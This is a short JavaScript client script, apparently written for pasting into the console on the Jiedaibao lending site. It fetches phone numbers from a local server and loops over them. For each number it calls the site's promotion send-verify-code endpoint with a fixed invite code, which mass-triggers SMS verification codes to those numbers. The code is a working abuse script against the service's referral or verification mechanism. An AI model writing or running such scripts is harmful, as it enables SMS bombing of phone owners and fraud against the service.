var prop = {};
prop.url = 'http://127.0.0.1:520';
// 1.js  为服务端 nodejs  程序, 用来给客户端 提供 手机号码
// 1.client.js  为 客户端程序, 向服务端跨域请求电话号码, 然后向借贷宝发送请求.
// 客户端 从本地服务器获取电话号码,然后在借贷宝的页面 控制台发送请求给借贷宝
// 这个例子只可以让用户获取到验证码
prop.success = function (json) {
    var numberArr = json.number;
    console.log(numberArr);
    numberArr.forEach(function (item) {
        prop.send(item);
    });
}
prop.error = function (err) {
    console.log(err);
}
prop.send = function (number) {
//    var url = "http://hd.jiedaibao.com/promotion/check-invite-status?icode=D07KCV7&mobile=" +
//        number + "&from=h5";
    var url = "http://hd.jiedaibao.com/promotion/send-verify-code?icode=D07KCV7&mobile=" +
        number + "&from=h5";
    $.ajax({
        url : url,
        type : 'GET',
        success : function (info) {
            console.log(info);
        },
        error : function (err) {
            console.log(err);
        }
    });
}
$.ajax({
    type : 'GET',
    async : true,
    url : prop.url,
    dataType : "jsonp",
    crossDomain : true,
    jsonp : "jsoncallback",
    success : function(json){
        prop.success && prop.success(json);
    },
    error:function(val){
        prop.error && prop.error(val);
    },
    complete : function(val){
        prop.complete && prop.complete(val);
    }
});